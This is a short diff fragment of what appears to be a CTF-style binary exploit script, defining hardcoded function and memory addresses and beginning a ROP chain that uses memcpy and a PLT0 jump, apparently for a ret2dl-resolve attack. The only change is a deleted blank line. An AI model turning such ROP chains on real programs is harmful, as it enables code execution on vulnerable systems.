@@ -13,7 +13,6 @@ read=0x80482e0
 memcpy=0x80482f0
 bss=0x8049800
 data_addr=bss+1024
-
 rop=flat(
 memcpy,p3r,dynstr_addr,data_addr,4,
 plt0,0x8,
